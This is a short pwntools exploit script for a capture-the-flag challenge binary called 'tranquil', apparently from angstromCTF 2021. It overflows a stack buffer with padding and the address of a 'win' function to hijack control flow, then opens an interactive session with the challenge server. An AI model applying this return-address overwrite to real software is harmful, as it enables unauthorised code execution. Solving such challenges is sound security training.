from pwn import *

e = ELF("./tranquil")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([e.path])
p = remote("pwn.2021.chall.actf.co", 21830)

#context.log_level="debug"
gdb.attach(p, """break * win""")


p.sendlineafter(":", "A"*68 + "BBBBBBBB" + p32(e.sym["win"]))





p.interactive()
